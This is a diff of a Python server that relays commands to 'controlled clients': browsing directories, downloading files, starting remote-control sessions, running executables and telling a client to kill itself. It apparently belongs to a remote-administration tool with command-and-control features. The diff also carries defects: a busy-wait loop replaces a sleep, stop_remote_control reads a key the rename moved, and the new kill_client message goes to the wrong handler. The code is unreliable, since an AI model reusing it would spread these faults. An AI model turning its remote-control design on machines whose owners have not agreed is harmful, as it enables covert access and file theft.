@@ -34,7 +34,7 @@ class Server:
         threading.Thread(target=self.accept_clients, daemon=True).start()
 
         while self.running:
-            time.sleep(0.1)
+            pass
 
     def accept_clients(self) -> None:
         while self.running:
@@ -114,7 +114,6 @@ class Server:
                 self.broadcast_controlled_clients_list()
 
     def broadcast_controlled_clients_list(self):
-            # Create a list of client data without socket objects
         client_list = [
             {key: value for key, value in client.items() if key != 'socket'}
             for client in self.controlled_clients
@@ -126,40 +125,40 @@ class Server:
                 "list": client_list  # Send filtered list instead of raw self.controlled_clients
             })
     def directory(self, data: Dict[str, Any], controll_client_id: str) -> None:
-        target_client = self.get_client(data["param"]["client_id"])
+        target_client = self.get_client(data["data"]["client_id"])
         if target_client:
             self.send_message(target_client["socket"], {
                 "mode": "directory",
-                "param": {
+                "data": {
                     "controll_client_id": controll_client_id,
-                    "root": data["param"]["root"]
+                    "root": data["data"]["root"]
                 }
             })
 
     def init_download(self, data: Dict[str, Any], controll_client_id: str) -> None:
-        target_client = self.get_client(data["param"]["client_id"])
+        target_client = self.get_client(data["data"]["client_id"])
         if target_client:
             self.send_message(target_client["socket"], {
                 "mode": "init_download",
-                "param": {
+                "data": {
                     "controll_client_id": controll_client_id,
-                    "file": data["param"]["file"],
-                    "output": data["param"].get("output", "")
+                    "file": data["data"]["file"],
+                    "output": data["data"].get("output", "")
                 }
             })
 
     def download(self, data: Dict[str, Any], controll_client_id: str) -> None:
-        target_client = self.get_client(data["param"]["client_id"])
+        target_client = self.get_client(data["data"]["client_id"])
         if target_client:
 
             while True:
                 if data["data"]["chunk"]:
                     message = {
                         "mode": "download",
-                        "param": {
+                        "data": {
                             "controll_client_id": controll_client_id,
-                            "file": data["param"]["file"],
-                            "output": data["param"].get("output", ""),
+                            "file": data["data"]["file"],
+                            "output": data["data"].get("output", ""),
                             "data": data["data"]["data"],
                             "chunk": True
                         }
@@ -168,10 +167,10 @@ class Server:
                 else:
                     message = {
                         "mode": "download",
-                        "param": {
+                        "data": {
                             "controll_client_id": controll_client_id,
-                            "file": data["param"]["file"],
-                            "output": data["param"].get("output", ""),
+                            "file": data["data"]["file"],
+                            "output": data["data"].get("output", ""),
                             "data": "",
                             "chunk": False
                         }
@@ -185,39 +184,47 @@ class Server:
             self.send_message(target_client["socket"], data)
 
     def remote_control(self, data):
-        target_client = self.get_client(data["client_id"])
+        target_client = self.get_client(data["data"]["client_id"])
+        param = data["data"]
         if target_client:
             self.send_message(target_client["socket"], {
                 "mode": "init_remote_control",
-                "controll_client_id": data["controll_client_id"],
-                "remote_control_id": data["remote_control_id"],
-                "data": data["data"]
+                "data": {
+                    "controll_client_id": param["controll_client_id"],
+                    "remote_control_id": param["remote_control_id"],
+                    "data": param["data"]
+                }
             })
 
     def stop_remote_control(self, data):
 
-        target_client = self.get_client(data["client_id"])
+        target_client = self.get_client(data["data"]["client_id"])
         if target_client:
             self.send_message(target_client["socket"], {
                 "mode": "stop_remote_control",
-                "remote_control_id": data["remote_control_id"],
+                "data": {
+                    "remote_control_id": data["remote_control_id"]
+                }
             })
 
     def run(self, data):
-        target_client = self.get_client(data["param"]["client_id"])
+        target_client = self.get_client(data["data"]["client_id"])
         if target_client:
-            self.send_message(target_client["socket"], {
-                "mode": "run",
-                "exe_path": data["param"]["exe_path"],
-            })
+            self.send_message(target_client["socket"], data)
+
+    def kill_client(self, data: Dict[str, Any]) -> None:
+        target_client = self.get_client(data["data"]["client_id"])
+        if target_client:
+            self.send_message(target_client["socket"], {"mode": "kill_self"})
 
     def handle_client_message(self, client_id: str, data: Dict[str, Any]) -> None:
 
-        print(data)
         if data["mode"] == "init":
             self.init_client(client_id, data)
         elif data["mode"] == "close":
             self.close_client(client_id)
+        elif data["mode"] == "kill_client":
+            self.close_client(data["close"])
         elif data["mode"] == "directory":
             self.directory(data, client_id)
         elif data["mode"] == "run":
